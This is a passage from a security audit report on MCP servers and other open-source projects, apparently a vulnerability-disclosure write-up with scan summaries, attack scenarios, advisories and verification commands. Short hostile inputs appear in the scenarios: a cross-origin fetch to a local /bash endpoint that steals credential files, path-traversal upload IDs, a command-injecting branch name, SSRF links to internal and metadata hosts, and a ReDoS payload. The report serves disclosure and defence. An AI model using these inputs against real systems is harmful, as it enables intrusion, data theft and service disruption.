* **Scenario B — Untrusted Local Web App Running on `localhost:<port>` Bypasses the Wildcard Port CORS Check:**
  1. Because `update_cors()` permits any port matching `http://localhost:*`, an untrusted local preview server or XSS flaw on `http://localhost:3000` can read `http://127.0.0.1:<cbm-port>/api/browse` from the browser.
* **Scenario C — Reverse Proxy (Nginx / Caddy) Forwarding `Host: localhost` Exposes `/api/browse` to the Network:**
  1. If a developer places Nginx in front of the UI for remote access and sets `proxy_set_header Host localhost;`, the `Host` header check in `http_server.c` is bypassed and `/api/browse` becomes reachable across the network.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** **Low.** The localhost CORS allowlist and `Host` header validation prevent remote websites from chaining a browser-based local code exfiltration attack.

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST/IaC/SCA audit on Codebase Memory MCP
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33" \
  --output-json "$HOME/audit-targets/reports/cbm-audit.json"

# 2. Verify CORS and Host header protections in http_server.c
sed -n '75,115p' "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33/src/ui/http_server.c"

# 3. Verify parameterized binding in the BFS SQL query in store.c:2845-2877
sed -n '2845,2877p' "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33/src/store/store.c"
```

---

## 6. GitLab MCP Server (`gitlab-mcp-server-v3.3.0-f92ed3e`)
* **SAST/IaC/SCA Summary:** `5` findings (`0 critical, 4 high, 0 medium, 1 low`).

### A. Verified Vulnerabilities
* No directly exploitable default code vulnerability.

### B. Context-Dependent Findings
1. **Opt-In Environment Variable TLS Verification Bypass (`CWE-295`):**
   * `internal/gitlab/client.go:1416`: Sets `InsecureSkipVerify: true` only if the user explicitly sets `GITLAB_MCP_SKIP_TLS_VERIFY=true`.
2. **GitHub Actions `pull_request_target`:** PR title/label validation workflow.

### C. Confirmed False Positives
1. **Go `os.Create` Path Traversal Alert (`recorder.go:84`):** `cmd/gen_orbit_record/recorder.go:84` — Opens a local output file specified via the `--out` flag in a developer CLI tool.
2. **Go `exec.Command` Command Injection Alert (`make.go:35`):** `cmd/audit_supply_chain/make.go:35` — Supply-chain audit script invoking the constant `"git"` binary with an argument array (`exec.Command("git", args...)`, shell-free).

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
In `internal/gitlab/client.go:1416`, the GitLab API client checks:
```go
// internal/gitlab/client.go:1412-1420
if os.Getenv("GITLAB_MCP_SKIP_TLS_VERIFY") == "true" {
    tlsConfig.InsecureSkipVerify = true
}
```
By default, TLS certificates are verified. However, developers connecting to self-hosted corporate GitLab instances with internal CA certificates often set `"GITLAB_MCP_SKIP_TLS_VERIFY": "true"` in `mcp_config.json` as a quick workaround instead of configuring a custom CA bundle. Once enabled, Go's HTTP client accepts any certificate without verification, handing the developer's high-privilege `GITLAB_PERSONAL_ACCESS_TOKEN` to any network man-in-the-middle (MITM) attacker.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Developer With `GITLAB_MCP_SKIP_TLS_VERIFY=true` Has GitLab PAT Stolen on Cafe/Hotel Wi-Fi:**
  1. An engineer adds `GITLAB_MCP_SKIP_TLS_VERIFY=true` to their IDE MCP config to silence certificate errors on an internal GitLab server.
  2. When the engineer opens their IDE on an untrusted Wi-Fi network, the MCP server connects out; a MITM attacker intercepts the TLS handshake with a self-signed certificate and captures the `Authorization: Bearer glpat-...` token.
* **Scenario B — Insecure Team MCP Configuration Template Propagated Across Engineering Org:**
  1. A team lead includes `GITLAB_MCP_SKIP_TLS_VERIFY=true` in a shared `claude_desktop_config.json` onboarding template to avoid certificate support tickets.
  2. Every developer in the organization permanently disables TLS verification, even when connecting to production GitLab hosts with valid certificates.
* **Scenario C — CI/CD Agent Behind Corporate TLS Inspection Proxy Disables TLS Verification Instead of Trusting Corporate CA:**
  1. A CI runner encountering certificate errors behind a corporate TLS inspection firewall is configured with `GITLAB_MCP_SKIP_TLS_VERIFY=true` instead of `SSL_CERT_FILE`, exposing source code and MR traffic to interception.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** **Low.** MITM risk arises only if the user explicitly enables `GITLAB_MCP_SKIP_TLS_VERIFY=true` on an untrusted network; no chaining findings exist.

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST/IaC/SCA audit on GitLab MCP Server
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e" \
  --output-json "$HOME/audit-targets/reports/gitlab-mcp-audit.json"

# 2. Verify the opt-in TLS flag in client.go:1416 and shell-free exec.Command in make.go:35
sed -n '1410,1425p' "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e/internal/gitlab/client.go"
sed -n '25,45p' "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e/cmd/audit_supply_chain/make.go"
```

---

## 7. Apktool MCP (`apktool-mcp-V3.0.2-12bb331`)
* **SAST/IaC/SCA Summary:** **`16` policy-exceeding findings**:
  * **Code (SAST):** `0 critical, 0 high, 1 medium` (XML entity expansion warning in candidate file and 2 false-positive privacy alerts mistaking the variable name `health_result` for healthcare data).
  * **Dependency Vulnerabilities (SCA — `uv.lock`):** **`4 critical, 12 high, 10 medium, 1 low`** (`anyio 4.9.0`, `certifi 2025.1.31`, `fastmcp 2.2.0`, `h11 0.14.0`, `mcp 1.6.0`, `starlette 0.46.2`).

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
Apktool MCP decompiles Android `.apk` packages and exposes `AndroidManifest.xml` and resource files to AI agents. While the first-party Python code contains no direct command injection, two risk vectors exist:
1. When XML files extracted from untrusted `.apk` archives are parsed with standard XML parsers, a maliciously crafted `AndroidManifest.xml` can trigger **XML Entity Expansion (Billion Laughs)** or external entity resolution, exhausting memory.
2. Its `uv.lock` pins older HTTP/SSE framework versions (`h11 0.14.0`, `starlette 0.46.2`, `fastmcp 2.2.0`, `mcp 1.6.0`) with known HTTP request smuggling, multipart DoS, and session-handling vulnerabilities when exposed over HTTP/SSE rather than local `stdio`.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Malicious Android APK Analysis Freezes Reverse-Engineering Workstation via Crafted `AndroidManifest.xml`:**
  1. A mobile security analyst submits a suspicious APK to Apktool MCP for automated analysis.
  2. Nested XML entity definitions (`<!ENTITY ...>`) inside the APK expand exponentially during parsing, exhausting RAM and CPU.
* **Scenario B — Shared Apktool MCP Server in HTTP/SSE Mode Disrupted via `h11 0.14.0` / `starlette 0.46.2` Flaws:**
  1. A security team deploys Apktool MCP in a shared container over HTTP/SSE (`fastmcp 2.2.0` + `starlette 0.46.2` + `h11 0.14.0`).
  2. Because `uv.lock` pins vulnerable HTTP parser versions, a single malformed HTTP request can desynchronize the server or cause a denial of service.
* **Scenario C — Missing Origin / DNS-Rebinding Protections in Older `mcp 1.6.0` & `fastmcp 2.2.0` Releases:**
  1. Older MCP SDK versions lack the stricter `Origin` and DNS-rebinding guards added in later releases.
  2. When a developer runs the server in HTTP mode while browsing the web, cross-origin requests can invoke MCP tools.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** No verified first-party critical SAST flaw exists, but `uv.lock` contains 16 high/critical dependency advisories (`fastmcp 2.2.0`, `mcp 1.6.0`, `h11 0.14.0`, `starlette 0.46.2`) that require upgrading (**SCA Maintenance / Dependency Risk: Medium**).

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST and SCA (uv.lock) audit on Apktool MCP
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331" \
  --output-json "$HOME/audit-targets/reports/apktool-mcp-audit.json"

# 2. Verify pinned SCA package versions in uv.lock
grep -E 'name = "(fastmcp|mcp|starlette|h11|anyio|certifi)"' -A 2 "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331/uv.lock"

# 3. View SCA and SAST breakdown via Sniper CLI report
python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json"
```

---

## 8. JADX MCP (`jadx-mcp-main-a8e5b7d`)
* **SAST/IaC/SCA Summary:** **`32` policy-exceeding findings**:
  * **Code (SAST):** `0 critical, 0 high, 3 medium` (no verified critical/high first-party source code vulnerability).
  * **Dependency Vulnerabilities (SCA — `uv.lock`):** **`6 critical, 26 high, 24 medium, 5 low`** (`anyio 4.10.0`, `authlib 1.6.8`, `certifi 2025.8.3`, `cryptography 46.0.5`, `fastmcp 3.0.2`, `pyjwt 2.11.0`, `mcp 1.26.0`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0`).

### D. How It Occurs in Code and Turns into a Vulnerability (Plain-Language Explanation)
JADX MCP bridges the desktop JADX reverse-engineering GUI plugin with LLM clients (Claude Desktop, Cursor, etc.). While the first-party Python code is a thin wrapper forwarding requests to the local JADX HTTP plugin, its `uv.lock` file pins **32 critical/high dependency vulnerabilities** (`authlib 1.6.8`, `pyjwt 2.11.0`, `cryptography 46.0.5`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0`).
When a user installs JADX MCP via `uv sync --frozen`, those exact vulnerable library versions are installed. If JADX MCP is exposed over HTTP/SSE with authentication (`authlib` / `pyjwt`) or multipart uploads (`python-multipart` / `starlette`), attackers can exploit algorithm confusion or multipart boundary DoS in the underlying libraries even though the first-party wrapper code is clean.

### E. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — OAuth/JWT Verification Flaw via `authlib 1.6.8` / `pyjwt 2.11.0` on a Remote Reverse-Engineering Server:**
  1. A security team runs JADX MCP over HTTP/SSE on a shared analysis server protected by `fastmcp` / `authlib` JWT authentication.
  2. Known verification flaws in pinned `authlib 1.6.8` and `pyjwt 2.11.0` allow a crafted token to bypass authentication checks.
* **Scenario B — Multipart Request Memory/CPU Exhaustion via `python-multipart 0.0.20` & `starlette 0.47.3`:**
  1. Crafted `multipart/form-data` requests with pathological boundary strings are sent to the HTTP-mode MCP server.
  2. The outdated `python-multipart` and `starlette` parsers consume excessive CPU/memory and stall the JADX MCP bridge.
* **Scenario C — Redirect Header Leak & Certificate Parsing Flaws in `urllib3 2.5.0` & `cryptography 46.0.5`:**
  1. When JADX MCP fetches remote symbol or resource URLs via `urllib3`, cross-origin redirects or malformed X.509 certificates can trigger known vulnerabilities in the locked versions.

### F. Standalone & Combined (Chaining) Severity Analysis
* **Standalone & Combined Severity:** No verified first-party SAST vulnerability is present, but `uv.lock` contains `32` high/critical SCA dependency findings (**SCA Maintenance / Dependency Risk: Medium**).

### G. Example Execution & Verification Commands
```bash
# 1. Run Sniper SAST and SCA audit on JADX MCP
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/jadx-mcp-main-a8e5b7d" \
  --output-json "$HOME/audit-targets/reports/jadx-mcp-audit.json"

# 2. Check pinned package versions in uv.lock
grep -E 'name = "(authlib|pyjwt|cryptography|python-multipart|starlette|urllib3)"' -A 2 "$HOME/audit-targets/jadx-mcp-main-a8e5b7d/uv.lock"

# 3. List high/critical SCA findings via Sniper CLI
python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
```

---

## Summary Comparison Table: Standalone vs. Combined (Chained) Severity & Evidence Status

| Repo | Sniper SAST / IaC / SCA Summary | Verified Source Evidence (Real vs. False Positive) | Standalone Severity | Do Findings Chain? | Combined (Chain) Severity & Disclosure Status |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **1. `autogpt`** | `93` exceeding (`2C / 39H`); `142` triaged | **Both critical SQLi (`obj.execute`), JWT, and FastAPI `Security()` alerts are false positives**; `jobstore_backfill.py` `pickle.loads` + Compose hardcoded password + Root Dockerfile are real | **Low / Medium** | **CONDITIONAL HYPOTHESIS:** Only if an attacker gains write access to DB table `apscheduler_jobs` do `pickle.loads` + Root container chain | **MEDIUM / HIGH (Conditional)** *(No verified direct unauth vuln; defense-in-depth hardening)* |
| **2. `zitadel`** | `67` exceeding (`8C / 42H`); `286` triaged | **All 8 critical SQLi/`exec` alerts are false positives**; 3 `docker.sock` mounts under `deploy/compose/` and `TLS_REJECT=0` in docs example are real | **Low / Medium** | **NO (Different Examples):** `docker.sock` (`deploy/compose/`) and `TLS_REJECT=0` (`apps/docs/...`) are in different compose files | **LOW / MEDIUM** *(Dev/example deployment hardening; not a product CVE)* |
| **3. `nextcloud-mcp`** | `59` exceeding (`SAST 1C/6H`, `IaC 7H`, `SCA 5C/40H`) | **`login_flow.py:192` SSRF (`_rewrite_to_nextcloud_host` in `initiate()`) and `token_utils.py` JWT are false positives**; `pact.yml` is `same-repo` guarded | **Low** | **NO:** `pact.yml` is closed to external fork PRs; `poll_endpoint` is pinned to `self.nextcloud_host` origin in `initiate()` | **LOW** *(No verified SAST vuln; internal CI hardening)* |
| **4. `mcpjam-inspector`** | `122` exceeding (`SAST 12C/8H`, `SCA 6C/96H`) | **18 of 20 C/H SAST findings are confirmed false positives** (14 comment `eval (`/ `exec (`, 2 `.d.ts`, 1 UI label, 1 UI concat); `pr-preview.yml` is `same-repo` guarded | **Low** | **NO:** External fork PRs are blocked; same-repo branch interpolation should be hardened | **LOW / MEDIUM** *(Internal CI hardening & SCA upgrade)* |
| **5. `codebase-memory-mcp`** | `32` exceeding (`SAST 17C/7H`, `SCA 8H`) | **`store.c:2864` SQLi, `c_lsp.h:54` comment, `kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` sized buffers, `xmalloc.c`, and `mcp.c` are false positives**; `http_server.c` has `localhost` CORS + `Host` (403) guard | **Low** | **NO:** `http_server.c` omits CORS headers for foreign origins and rejects DNS rebinding | **LOW** *(Remote browser code exfiltration chain invalid)* |
| **6. `gitlab-mcp-server`** | `5` exceeding (`0C / 4H`) | `recorder.go` and `make.go` are false positives; `GITLAB_MCP_SKIP_TLS_VERIFY=true` is active only if explicitly set by user | **Low** | **NO:** No chaining findings exist | **LOW** *(Opt-in setting)* |
| **7. `apktool-mcp`** | `16` exceeding (`SAST 1 Medium`, `SCA 4C / 12H`) | SAST privacy alerts are false positives; **`uv.lock` contains 4 critical, 12 high SCA dependency records** | **Low / Medium (SCA)** | **NO:** No verified first-party code chain; dependency upgrades required | **LOW / MEDIUM (SCA)** *(SAST clean, SCA records present)* |
| **8. `jadx-mcp`** | `32` exceeding (`SAST 3 Medium`, `SCA 6C / 26H`) | No verified critical/high SAST vulnerability; **`uv.lock` contains 6 critical, 26 high SCA dependency records** | **Low / Medium (SCA)** | **NO:** No verified first-party code chain; dependency upgrades required | **LOW / MEDIUM (SCA)** *(No C/H SAST, SCA records present)* |

---

## Part III — Verified Vulnerabilities Discovered in Our Sniper Scans (11 Verified Security Advisories, Code-to-Vulnerability Mechanics, Everyday Scenarios & Example Execution Commands)

Below are the **11 verified security vulnerabilities** ([advisories/README.md](advisories/README.md)) discovered during security scans conducted with the **Sniper** static/dynamic analysis engine — complete with **Step-by-Step Everyday Critical Scenarios (`Scenario A / B / C`)**, **End-to-End Runtime Proofs (`RED -> GREEN + BENIGN`)**, and **Verified Defensive Patches (`git diff`)**. First is the summary table, followed immediately by **11 in-depth technical sections (`III.01` – `III.11`)** explaining how each bug arises in source code, how it turns into an exploitable vulnerability, 3 everyday critical scenarios, and example execution/verification commands:

| # | Advisory & Upstream GHSA ID | Target Project & Component | CWE & CVSS v3.1 | Critical Everyday Impact Scenarios (`Scenario A / B / C`) | Runtime Proof (`RED -> GREEN`) |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** A symbolic link `invoice.pdf -> /configs/settings.yml` dropped into a shared SMB/NFS office scanner folder bypasses `FolderAccessGuard` in default `recursive=false` mode and exfiltrates admin/OAuth/SMTP secrets into the readable output folder.<br/>**B)** In an automated SFTP/Nextcloud document ingestion pipeline, a dropped symlink causes `FolderOutputSink.archiveOriginal()` to copy/move host SSH keys or `.env` files into the archive store.<br/>**C)** Across multi-tenant department watched folders, one department symlinks a sibling department's confidential contracts/payroll directory to read and archive unauthorized files. | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` Incomplete Fix)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** Submitting an external webpage to `/api/v1/convert/url/pdf` containing `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` or cloud metadata (`169.254.169.254`) causes WeasyPrint to fetch and embed internal responses directly into the generated PDF.<br/>**B)** While Java's `SsrfProtectionService` checks only the top-level URL, the WeasyPrint subprocess fetches `@import url("http://10.0.0.12:9090/metrics")` across internal Kubernetes/Docker services.<br/>**C)** Sub-resources using HTTP `302` redirects (`<img src="...">` / `<link>`) exfiltrate internal admin dashboards behind firewalls into downloadable PDFs. | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** When a developer visits any webpage while `npx cuabot` is running, page JS executes `fetch("http://localhost:7842/bash")` (`Access-Control-Allow-Origin: *`) to run arbitrary commands and steal mounted `~/.cuabot/user/.claude/.credentials.json` OAuth tokens.<br/>**B)** Using cross-origin `POST /bash` or `ws://localhost:7842/?command=...` (CSWSH), a webpage injects persistent `PreToolUse` shell hooks into the writable `/home/community-user/.claude/settings.json` mount.<br/>**C)** Because `cuabotd` binds to `0.0.0.0:7842`, any peer on cafe/office Wi-Fi can call `/bash` and `/screenshot` without authentication to monitor the screen and execute commands. | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** While an ML researcher runs RL workers locally, a visited webpage calls `http://127.0.0.1:8001/reset` (`allow_origins=["*"]`), bypassing `ip_filter_middleware` and executing arbitrary `<env_path>/main.py` on the host via `spec.loader.exec_module`.<br/>**B)** In Kubernetes/Docker Compose deployments where `OSGYM_ALLOWED_IPS=""` is empty, `if allowed_ips:` fails open and exposes unauthenticated RCE on `0.0.0.0:8001` to the entire network.<br/>**C)** Any cross-origin page or LAN peer polls `GET /screenshot` and `POST /step` to silently capture live desktop screenshots and inject keyboard/mouse commands. | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** A single sandbox tenant sends `DELETE /daytona/dummy?uploadId=../objects` without initiating a multipart upload, triggering unconditional `tokio::fs::remove_dir_all` and wiping the entire organization's `objects/` snapshot store.<br/>**B)** Supplying `?uploadId=../../state` or `?uploadId=../../db` traverses above `d.objects.root` to delete arbitrary host directories writable by `cua-spacesd`.<br/>**C)** Sending `PUT /daytona/key?partNumber=1&uploadId=../stage` writes multipart upload chunks into sibling application directories outside `uploads/`. | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** During a macOS remote desktop window/resolution resize, an undersized `FrameData::Nv12` slice is copied via unchecked `unsafe { std::ptr::copy_nonoverlapping }`, reading `960` bytes of adjacent heap memory (session tokens/secrets) into H.264 video frames streamed to viewers.<br/>**B)** Passing an empty or short `NV12`/`BGRA` slice to safe Rust `VtEncoder::encode` dereferences unmapped memory and crashes the `cua-spacesd` media daemon with `SIGSEGV`.<br/>**C)** Mismatched `y_stride` / `uv_stride` or `stride * (h - 1)` arithmetic steps past buffer bounds in multi-tenant media streaming processes. | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** On a university/corporate lab LAN, anyone connects to `0.0.0.0:8006` (unauthenticated noVNC) or `0.0.0.0:3390` (passwordless RDP) to take over the Windows VM desktop and steal injected benchmark API keys.<br/>**B)** From the compromised VM, the attacker modifies host scripts inside the writable `-v {setup_path}:/shared` mount (`winarena_adapter/infra/vm/setup`), poisoning the host filesystem.<br/>**C)** Inside the VM, `server/main.py` on `0.0.0.0:5000` exposes unauthenticated `POST /execute_windows` (`exec()`) and `POST /setup/launch` (`shell=True`) to arbitrary command execution. | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** When a DevOps engineer runs `ziti edge login` over Wi-Fi/VPN, unconditional `InsecureSkipVerify: true` in `AreCertsTrusted` -> `InsecureClient` accepts a rogue MITM certificate with *"Verified that server supplied certificates are trusted"* and sends admin credentials to the attacker.<br/>**B)** Automated CI/CD and Kubernetes bootstrap pipelines running `ziti edge login` trust a spoofed or compromised Edge Controller and enroll identities/routers to the attacker.<br/>**C)** Expired, revoked, or wrong-CA controller leaf certificates are silently accepted as trusted without warning, breaking the Zero-Trust PKI chain. | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** Sending a 20 KB `"a.a.a...a@!"` payload to a public lead-capture n8n Webhook (`{{$json.body.contact.isEmail()}}`) stalls the single-threaded Node.js event loop for ~832 ms; 10 concurrent requests freeze all Stripe/Slack webhooks and the n8n UI.<br/>**B)** An automated support-ticket triage workflow calling `{{$json.text.extractEmail()}}` stalls on a single malformed dotted message body, triggering Kubernetes health-check restart loops.<br/>**C)** CRM data-enrichment workflows evaluating `{{$json.url.extractDomain()}}` (`DOMAIN_EXTRACT_REGEXP`) suffer catastrophic backtracking on long dotted hostname inputs. | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** With `SSL.RedirectToHTTPS=true`, a request with a spoofed `Host: attacker-gotify.example.com` header receives an `HTTP/1.1 308 Permanent Redirect` to the attacker's domain, poisoning browser caches and leaking `?token=` URLs.<br/>**B)** Monitoring/alerting scripts (`curl -L`, Python `requests`, Uptime Kuma) hitting the HTTP endpoint with `?token=<app-token>` follow the `308` redirect and hand the secret token to the attacker's server.<br/>**C)** Behind a reverse proxy or shared HTTP cache that forwards `Host`, cache poisoning redirects all subsequent Gotify users to a phishing host. | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** A crafted PR branch name `feat";<cmd>;#` executes arbitrary shell commands inside `_build-and-package.yml` on the persistent `xrd-runner-8c` self-hosted runner before code review or `actions/checkout` even runs.<br/>**B)** Because `build.yaml` invokes `_build-and-package.yml` with `permissions: contents: write, packages: write` and `secrets: inherit`, the injected command accesses inherited secrets and a `GITHUB_TOKEN` with GHCR package-write privileges.<br/>**C)** Because `xrd-runner-8c` is a persistent self-hosted runner rather than an ephemeral VM, the attacker can poison local Gradle/Docker build caches or plant background processes affecting subsequent official X-Road builds. | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — Watched-Folder Symbolic Link (`Symlink`) Escape Bypassing `FolderAccessGuard` (`GHSA-hpc7-xx5r-gc44`, `CWE-59`/`CWE-61`, CVSS `7.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `Stirling-Tools/Stirling-PDF` (`Maven: stirling.software:stirling-pdf`)
* **Affected Versions & Components:** `<= v3.2.2` (`commit 684608d143779bf3a8ffc67639f077a1202c62ff`) — `FolderInputSource.java` (`listFiles`, lines `337-377`), `ProcessingFolderController.java` (lines `374-380`), `FolderOutputSink.java` (`archiveOriginal`, lines `338-345`)
* **Vulnerability Class & Score:** `CWE-59` (Improper Link Resolution Before File Access) / `CWE-61` (UNIX Symbolic Link Following) — **CVSS v3.1: `7.1 High`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Link:** `GHSA-hpc7-xx5r-gc44` (`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`)
* **Standalone Sniper Advisory:** [`docs/advisories/01-STIRLING-CAND-02-SYMLINK.md`](advisories/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
Stirling-PDF's **Automated Processing Watched Folder** pipeline monitors a shared directory (such as `/mnt/scanner-incoming`) and automatically processes incoming documents into an output folder (`/mnt/scanner-processed`). To prevent this feature from reading the server's own protected configuration files (`/configs/settings.yml`), the developers implemented a security guard called `FolderAccessGuard.isProtected(path)`.

However, Java's standard `Files.isRegularFile(path)` method has a critical pitfall: **unless `LinkOption.NOFOLLOW_LINKS` is passed as the second argument, it transparently follows symbolic links (symlinks)** and returns `true` if the target file is a regular file! Meanwhile, `FolderAccessGuard.isProtected(path)` checks only the lexical path inside the watched folder (`path.toAbsolutePath().normalize()`) rather than resolving the real target path (`toRealPath()`).

Here is the exact vulnerable code in `FolderInputSource.java:337-350`:
```java
// app/proprietary/src/main/java/stirling/software/proprietary/policy/input/FolderInputSource.java:337-350
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // Default mode (recursive = false)
        try (Stream<Path> entries = Files.list(inputDir)) {
